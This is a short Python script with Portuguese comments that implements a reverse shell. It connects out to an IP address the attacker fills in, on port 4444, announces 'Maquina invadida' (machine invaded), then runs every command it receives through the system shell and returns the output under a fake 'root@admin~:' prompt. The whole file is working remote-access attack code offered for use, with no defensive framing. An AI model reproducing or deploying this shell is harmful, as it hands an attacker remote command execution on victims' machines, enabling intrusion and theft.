import socket
import subprocess

ip = "" #seu endereço de ip
port = 4444 #pode ser qualquer porta

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send("Maquina invadida :: Pressione Enter")

if s:
	while True:
		dados = s.recv(1024)
		proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		saida = proc.stdout.read() + proc.stderr.read()
		s.send("\n"+saida)
		s.send("root@admin~: ")
